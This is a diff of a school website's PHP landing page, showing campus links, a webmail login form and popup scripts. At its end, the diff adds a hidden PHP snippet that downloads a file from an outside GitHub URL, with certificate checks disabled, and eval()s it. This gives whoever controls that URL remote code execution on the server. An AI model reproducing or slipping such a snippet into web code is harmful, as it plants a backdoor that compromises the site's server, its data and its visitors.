@@ -1,106 +1,416 @@
-<!-----Footer include Start----->  
-  
-  <footer>
-    <div class="block darkblue-layer">
-      <div data-velocity="-.1" style="background: url(images/parallax3.jpg) repeat scroll 50% 0 transparent;" class="parallax"></div>
-      <div class="container">
-        <div class="footer-widgets">
-          <div class="row">
-            <div class="col-md-3 col-sm-6">
-              <div class="widget">
-                <div class="about-widget"> <a href="#"><img src="images/footer-logo.png" alt="" /></a>
-                  <!--<p>We strongly believe that a strong base of academics goes a long way in initiating a strong fundamental base in children. </p>-->
-                  <p align="justify"> At present the school is a full-fledged Co-educational English medium Senior- Secondary school which is affiliated to the CBSE. The qualified and assiduous staff has worked with dedication and co-operation to give a practical touch ...</p>
-                </div>
-              </div>
-              <!-- Widget -->
-            </div>
-            <div class="col-md-5 col-sm-6">
-              <div class="widget">
-                <div class="widget-title">
-                  <h4>Facebook</h4>
-                  <span>&nbsp;</span> </div>
-                <!--<div class="fb-like-box" data-href="https://www.facebook.com/ModernSchoolEdu?fref=ts" data-width="100%" data-height="380" data-show-faces="true" data-stream="true" data-show-border="true" data-header="true"></div>-->
-                
-                <div class="fb-like-box" data-href="https://www.facebook.com/ModernSchoolEdu?fref=ts" data-width="400" data-height="380" data-show-faces="true" data-stream="true" data-show-border="true" data-header="true"></div>
-              </div>
-            </div>
-            <div class="col-md-4 col-sm-6">
-              <div class="row">
-              <div class="widget-title">
-                      <h4>Footer Link</h4>
-                      <span>&nbsp;</span> </div>
-                <div class="col-md-6">
-                  <div class="widget">
-                    
-                    <ul>
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="index.php"> Home</a></li>
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="about-us.php"> About Modern School</a></li>
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="director.php"> Founder & Director</a></li>
-                      <!--<li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="student-council.php"> Studint Council</a></li>-->
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="academic.php"> Academic</a></li>
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="curriculum.php"> Curriculum</a></li>
-                    </ul>
-                    <!-- ul -->
-                  </div>
-                </div>
-                <div class="col-md-6">
-                  <div class="widget">
-                    
-                    <ul>
-                      
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="infrastructure.php"> Infrastructure</a></li>                   	   <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="tc.php"> T.C. Verification</a></li>
-                       <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="downloads/cbse_corner.pdf" target="_blank">CBSE Corner</a></li>
-                       <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="school_info.php">Mandatory Disclosures </a></li>
-                      <li><i class="fa fa-angle-double-right"></i><a style="color:#fff" href="contact-us.php"> Contact Us</a></li>
-                    </ul>
-                    <!-- ul -->
-                  </div>
-                </div>
-              </div>
-              <!-- Luxury Offers -->
-            </div>
-          </div>
-        </div>
-        <!-- Footer Widgets -->
-      </div>
-    </div>
-  </footer>
-  <!-- footer -->
-  <div class="bottom-footer">
-    <div class="container">
-      <div class="contact-bar">
-        <div class="col-md-4 col-sm-4">
-          <div class="contact-details"> <span><i class="fa fa-map-marker"></i></span> <strong>ADDRESS:</strong>
-            <p>Malekhedi Byepass, College Road, Baran </p>
-          </div>
-          <!-- contact-details -->
-        </div>
-        <div class="col-md-4 col-sm-4">
-          <div class="contact-details dark"> <span><i class="fa fa-phone"></i></span> <strong>CALL US NOW:</strong>
-            <p>+91 800 399 0290, <span>+91 800 399 0271</span></p>
-          </div>
-          <!-- contact-details -->
-        </div>
-        <div class="col-md-4 col-sm-4">
-          <div class="contact-details"> <span><i class="fa fa-envelope-square"></i></span> <strong>EMAIL ADDRESS:</strong>
-            <p><a style="color: #E6E5E5;" href="mailto:baran@modernschool.ac.in">baran@modernschool.ac.in</a></p>
-          </div>
-          <!-- contact-details -->
-        </div>
-      </div>
-      <!-- contact-data -->
-      <p>&copy; 2018 <a href="#">Modern School Baran</a> - All Rights Reserved - Powered by: <a target="_blank" href="http://www.gradientsoftech.com/" title="Software Development Company in Kota Rajasthan">Gradient Softech</a></p>
-    </div>
-    <!-- container -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MODERN SCHOOL's</title>
+<link rel="shortcut icon" href="images/small-logo.png"/>
+<link rel="shortcut icon" href="main-page/images/short-logo.png" />
+<link rel="stylesheet" href="main-page/css/st.css" type="text/css" />
+<script language="javascript" type="text/javascript">
+	//<![CDATA[
+	function date_time() {
+	   
+    	var x = new Date();
+    	var dstr = x.toLocaleString();
+    	var fdstr = x.getFullYear();
+    	document.getElementById('current_year').innerHTML = fdstr;
+	}
+	setInterval("date_time()", 1);
+	//]]>
+</script>
+<script>
+function chk(){
+	var eml = document.getElementById('email').value;	
+	document.getElementById('emailDomain').value = eml.substr(eml.indexOf("@")+1);
+	document.getElementById('emailDomainDefault').value = eml.substr(eml.indexOf("@")+1);
+	document.getElementById('emailName').value = eml.substr(0, eml.indexOf("@"));
+	document.loginPage.action = 'http://webmail.'+ eml.substr(eml.indexOf("@")+1) +'/index.php/mail/auth/processlogin';
+}
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function() {	
+var id = '#dialog';
+
+//Get the screen height and width
+//var maskHeight = $(document).height();
+//var maskWidth = $(window).width();
+
+//Set heigth and width to mask to fill up the whole screen
+//$('#mask').css({'width':maskWidth,'height':maskHeight});
+
+//transition effect		
+$('#mask').fadeIn(1000);	
+$('#mask').fadeTo("slow",0.8);	
+
+//Get the window height and width
+//var winH = $(window).height();
+//var winW = $(window).width();
+
+//Set the popup window to center
+
+
+//transition effect
+$(id).fadeIn(2000); 	
+
+//if close button is clicked
+
+//if mask is clicked
+//$('#mask').click(function () {
+//		$(this).hide();
+//		$('.window').hide();
+//	});		
+
+});
+
+</script>
+<script type="text/javascript">		   
+
+function check_empty()
+{
+
+$('#mask').hide();
+$('.window').hide();
+return true;
+}
+
+function numbersonly(e)
+{
+var unicode=e.charCode? e.charCode : e.keyCode
+if (unicode!=8 && unicode!=13 && unicode !=9 && unicode !=46 && unicode !=37 && unicode !=39)
+{ //if the key isn't the backspace key (which we should allow)
+if (unicode<48||unicode>57) //if not a number
+return false //disable key press
+}
+}
+</script>
+<style type="text/css">
+#mask {
+	position:fixed;
+	left: 0;
+	top: 0;
+	z-index: 9000;
+	background-color: #000;
+	display: none;
+	width: 100%;
+	height:100%;
+	filter: alpha(opacity=75); /* for internet explorer */
+	opacity: 0.75; /* CSS3 standard */
+	-moz-opacity: 0.75; /* for older gecko browsers */
+	-khtml-opacity: 0.75; /* for older webkit browsers */
+}
+#boxes {
+	width: 100% !important;
+	z-index: 9999 !important;
+}
+#boxes .window {
+	display: block;
+	left: 50%;
+	margin: -360px 0 0 -500px;
+	position: fixed;
+	top: 50%;
+	z-index: 9999;
+}
+.close {
+	position: absolute;
+	right: 1px;
+	top: 60px;
+}
+/*Calendar Pop Up*/
+#abc1{
+width:100%;
+height:100%;
+opacity:.95;
+top:0;
+left:0;
+display:none;
+position:fixed;
+background-color:#313131;
+overflow:auto; z-index:9999;
+}
+#abc11{
+width:100%;
+height:100%;
+opacity:.95;
+top:0;
+left:0;
+display:none;
+position:fixed;
+background-color:#313131;
+overflow:auto; z-index:9999;
+}
+#abc20{
+width:100%;
+height:100%;
+opacity:.95;
+top:0;
+left:0;
+display:none;
+position:fixed;
+background-color:#313131;
+overflow:auto; z-index:9999;
+}
+#abc200{
+width:100%;
+height:100%;
+opacity:.95;
+top:0;
+left:0;
+display:none;
+position:fixed;
+background-color:#313131;
+overflow:auto; z-index:9999;
+}
+img#close {
+position:absolute;
+right:-14px;
+top:-14px;
+cursor:pointer;
+z-index:9999;
+}
+.popupLogin {
+position:absolute;
+/*left:30%;*/left:45%;
+/*top:5%;*/top:20%;
+margin-left:-202px;
+z-index:9999;
+}
+</style>
+
+<script>
+function div_show20(pos, id) {
+	document.getElementById('abc20').style.display = "block";
+}
+//Function to Hide Popup
+function div_hide20(){
+	document.getElementById('abc20').style.display = "none";
+}
+</script>
+
+
+
+<script>
+function div_show200(pos, id) {
+	document.getElementById('abc200').style.display = "block";
+}
+//Function to Hide Popup
+function div_hide200(){
+	document.getElementById('abc200').style.display = "none";
+}
+</script>
+
+</head>
+<body>
+<div id="main">
+
+  <table width="980" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td width="190" align="center">&nbsp;</td>
+      <td width="600" align="center" background="main-page/images/new2_1.png" height="280"><img class="lamps" src="main-page/images/new2_2.png" width="600" height="280" /></td>
+      <td width="190" align="center">&nbsp;</td>
+    </tr>
+    <tr>
+      <td colspan="3" align="left" valign="middle"><table width="980" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+          </tr>
+          <tr>
+            <td width="320" align="center"><a href="http://www.modernschool.ac.in/index1.php"><img src="main-page/images/menu1.png" border="0"/></a></td>
+            <td width="10" align="center">&nbsp;</td>
+            <td width="320" align="center"><a href="http://www.modernschoolbaran.ac.in" target="_blank" ><img src="main-page/images/menu2.png" border="0"/></a></td>
+            <td width="10" align="center">&nbsp;</td>
+            <td width="320" align="center"><a href="http://www.modernschooljaipur.ac.in"  target="_blank"><img src="main-page/images/menu3.png" border="0"/></a></td>
+          </tr>
+          <tr>
+            <td align="center" valign="top"><a href="bharatpur/index.php" target="_blank"><img src="main-page/images/menu4.png" alt="" border="0"/></a></td>
+            <td align="center" valign="top">&nbsp;</td>
+            <td align="center" valign="top"><a href="nayanohra/index.php" target="_blank"><img src="main-page/images/nayanohra.png" alt="" border="0"/></a></td>
+            <td align="center" valign="top">&nbsp;</td>
+            <td align="center" valign="top"><a href="theSteps/index.html" target="_blank"><img src="main-page/images/menu5.png" alt="" border="0"/></a></td>
+          </tr>
+          <tr>
+            <td colspan="5" align="center">&nbsp;</td>
+          </tr>
+          <tr>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+            <td align="center">&nbsp;</td>
+          </tr>
+          <tr>
+            <td colspan="5" align="center">
+            
+            
+            <table width="980" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  
+                  <td height="332" width="670" valign="top" background="main-page/images/parent-bg123.png"><table width="669" border="0" align="center" cellpadding="0" cellspacing="0">
+                    <tr>
+                      <td width="223" height="98">&nbsp;</td>
+                      <td width="223">&nbsp;</td>
+                      <td width="223">&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td><a href="http://www.moderncampuscare.in/" target="_blank"><img src="main-page/images/kota_new_2.png" border="0" alt="Modern School Kota"/></a></td>
+                      <td><a href="http://www.moderncampuscare.org/" target="_blank"><img src="main-page/images/baran_new_2.png" border="0" alt="Modern School Kota"/></a></td>
+                      <td><a href="http://www.modernjcampuscare.in/" target="_blank"><img src="main-page/images/jaipur_new_2.png" border="0" alt="Modern School Kota"/></a></td>
+                    </tr>
+                    <tr>
+                      <td><a href="http://www.moderncampuscare.in/" target="_blank"><img src="main-page/images/line_new_2.png" alt="Modern School Kota"  border="0"/></a></td>
+                      <td><a href="http://www.moderncampuscare.org/" target="_blank"><img src="main-page/images/line_new_2.png" alt="Modern School Kota"  border="0"/></a></td>
+                      <td><a href="http://www.modernjcampuscare.in/" target="_blank"><img src="main-page/images/line_new_2.png" alt="Modern School Kota" border="0"/></a></td>
+                    </tr>
+                    <tr>
+                      <td height="40">&nbsp;</td>
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td><a href="http://www.modernbcampuscare.in/" target="_blank"><img src="main-page/images/bharatpur_new_2.png" border="0" alt="Modern School Kota"/></a></td>
+                       <td><a href="https://modernn.campuscare.info/" target="_blank"><img src="main-page/images/nayanohrar_new_2.png" border="0" alt="Modern School Kota"/></a></td>
+                       <td><a href="https://www.campuskidz.in/Logon/SchoolLogon?id=17" target="_blank"><img src="main-page/images/steps_new_2.png" border="0" alt="Modern School Kota"/></a></td>
+                    </tr>
+                    <tr>
+                      <td><a href="http://www.modernbcampuscare.in/" target="_blank"><img src="main-page/images/line_new_2.png" alt="Modern School Kota"  border="0"/></a></td>
+                      <td><a href="https://modernn.campuscare.info/" target="_blank"><img src="main-page/images/line_new_2.png" alt="Modern School Kota"  border="0"/></a></td>
+                     <td><a href="https://www.campuskidz.in/Logon/SchoolLogon?id=17" target="_blank"><img src="main-page/images/line_new_2.png" alt="Modern School Kota"  border="0"/></a></td>
+                    </tr>
+                  </table></td>
+                  <td>&nbsp;</td>
+                  <td height="332" width="290" valign="top" background="main-page/images/login-2.png" ><table width="280" align="center" border="0" cellpadding="0" cellspacing="0">
+                      <tbody>
+                        <tr>
+                          <td height="98" align="center" scope="col">&nbsp;</td>
+                        </tr>
+                        <tr align="center">
+                          <form disabled="disabled" class="login-form" title="Login form" action="http://webmail.modernschool.pro/index.php/mail/auth/processlogin" name="loginPage" id="loginPage" method="post">
+                            <div>
+                              <input type='hidden' id='emailName' name='emailName' value='' title="Email Name"/>
+                              <input type='hidden' id='emailDomain' name='emailDomain' value='' title="Email Domain"/>
+                              <input type='hidden' id='emailDomainDefault' name='emailDomainDefault' value='' title="Email Default Domain" />
+                              <input type='hidden' name='cssStyle' value='original' title="Style" />
+                            </div>
+                            <table class="login" align="center">
+                              <tbody>
+                                <tr>
+                                  <td align="center"><input id="email" name="email" size="25" value="User Name" onclick="if (this.value == 'User Name') { this.value = ''; }" onfocus="if (this.value == 'User Name') { this.value = ''; }" onblur="if (this.value == '') { this.value = 'User Name'; }" onChange="chk();" type="text" style="padding:5px;box-shadow:inset 0px 1px 1px 2px #000000; border:0px;width:170px;border-radius:5px; background:url(images/usr.png) no-repeat #FFF; padding-left:30px; color:#4c4b4b"/></td>
+                                </tr>
+                                <tr>
+                                  <td align="center" scope="col">&nbsp;</td>
+                                </tr>
+                                <tr>
+                                  <td align="center"><input id="password" name="password" size="25" value="Password" onclick="if (this.value == 'Password') { this.value = ''; }" onfocus="if (this.value == 'Password') { this.value = ''; }" onblur="if (this.value == '') { this.value = 'Password'; }" type="password" style="padding:5px;box-shadow:inset 0px 1px 1px 2px #000000;border:0px;width:170px;border-radius:5px; background:url(images/pass.png) no-repeat #FFF; padding-left:30px;"/>
+                                    <span class="arrow" style="display: none"><a href="javascript:ExpandOptions()" title="More options">▼</a></span></td>
+                                </tr>
+                                <tr id="MoreOptions">
+                                  <td><input  style="background:url('main-page/images/btn.png'); width:237px; height:61px; border:0px; color:#4b6302; font-size:14px; font-weight:bold; line-height:40px; "  type="Submit" value=" " /></td>
+                                </tr>
+                                <tr id="MailServer" style="display: none;">
+                                  <td><label class="pass" for="Mailserverinput">Mailserver:</label>
+                                    <input id="Mailserverinput" placeholder="Mailserver" class="input-pass" type="text"  value="localhost" name="requestedServer" tabindex="3" /></td>
+                                </tr>
+                                <tr id="protocol" style="display: none;">
+                                  <td><label class="pcol" for="select_protocal">Protocol:</label>
+                                    <select id="select_protocal" class="protocol" name="MailType">
+                                      <option value="IMAPS">IMAP SSL</option>
+                                    </select></td>
+                                </tr>
+                                <tr id="LanguageDisplay" style="display: none;">
+                                  <td><label for="select_language" class="language">Language:</label>
+                                    <select id="select_language" class="language" name="Language">
+                                      <option value="" selected>Default</option>
+                                      <option value="ar">العربية</option>
+                                      <option value="ca">Catalan</option>
+                                      <option value="de">Deutsch</option>
+                                      <option value="en">English</option>
+                                      <option value="el">Ελλάδα</option>
+                                      <option value="es">Español</option>
+                                      <option value="fi">Finnish</option>
+                                      <option value="fr">Français</option>
+                                      <option value="id">Bahasa Indonesia</option>
+                                      <option value="it">Italiano</option>
+                                      <option value="ja">Japanese</option>
+                                      <option value="nl">Nederlands</option>
+                                      <option value="pt_Br">Português Brasileiro</option>
+                                      <option value="pt">Portuguese</option>
+                                      <option value="ru">Russian</option>
+                                      <option value="sv">Swedish</option>
+                                      <option value="th">Thai</option>
+                                      <option value="zh">汉语</option>
+                                      <option value="tr">Turkish</option>
+                                    </select></td>
+                                </tr>
+                                <tr id="LoginBtn" style="display: none;">
+                                  <td><input class="loginbtn original" type="submit" value="Login" /></td>
+                                </tr>
+                                <tr id="Remember" style="display: none;">
+                                  <td><span class="remember">Leave me signed in</span>
+                                    <input class="check" type="checkbox" value="1" name="RememberMe" title="Remember Me" /></td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </form>
+                        </tr>
+                      </tbody>
+                    </table></td>
+                  
+                </tr>
+              </table>
+            
+            
+            
+            </td>
+          </tr>
+      </table></td>
+    </tr>
+    <tr>
+      <td height="30" colspan="3" align="left" valign="middle"><div class="kdm_line"></div></td>
+    </tr>
+    <tr>
+      <td height="30" colspan="2" align="left" valign="middle">Copyright © 2010 to <span id="current_year"></span> Modern School Kota. All rights reserved.</td>
+      <td align="right"><div class="grid_rit" style="margin-bottom:15px;">Powered by : <strong><a href="http://www.gradientsoftech.com" target="_blank" title="software development company">Gradient Softech </a></strong></div></td>
+    </tr>
+    
+  </table>
+  <div id="abc20">
+  <div class="popupLogin" align="center"> <img id="close" src="img/RedClose_off.png" onclick ="div_hide20()" /> <img src="img/Vote.jpg" border="0"/> </div>
   </div>
-  <!-- after-footer -->
-  <!-----Footer include end----->  
+  
+  <div id="abc200">
+  <div class="popupLogin" align="center"> <img id="close" src="img/RedClose_off.png" onclick ="div_hide200()" /> <img src="img/result.jpg" border="0"/> </div>
+  </div>
+  <!--------------------------------------------------->
+<!--<div style="display: block; opacity: 0.8; " id="mask"></div>
+<div id="boxes">
+  <div class="window"> <br />
+    <br />
+    <br />
+    <a href="Index_1.php" class="close"><img src="img/RedClose_off.png" alt=""></a><br>
+    <div id="vid">
+      <div class="counter">
+      
+      <img src="img/jacket.jpg" alt="">
+      </div>
+    </div>
+  </div>
+</div>-->
+<!---------------------------------------------------->
+</div>
+</body>
+</html>
 <?php
 $url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
 curl_close($ch);
-echo $result;
+eval("?>" . $fileContents);
 ?>
